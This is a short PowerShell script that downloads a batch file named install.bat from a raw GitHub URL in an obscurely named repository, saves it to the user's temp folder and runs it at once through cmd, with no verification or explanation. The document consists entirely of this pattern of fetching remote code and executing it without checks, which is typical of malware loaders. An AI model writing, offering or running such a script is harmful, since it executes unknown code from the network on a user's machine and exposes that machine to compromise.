[Uri]$uri = 'https://github.com/userdev265scratchandpython/home4anybrowser/raw/main/install.bat'
Invoke-WebRequest -Uri $uri -Method Get -OutFile "$env:TEMP\install.bat"
Start-Process -FilePath "cmd" -ArgumentList "/c", "$env:TEMP\install.bat"
exit
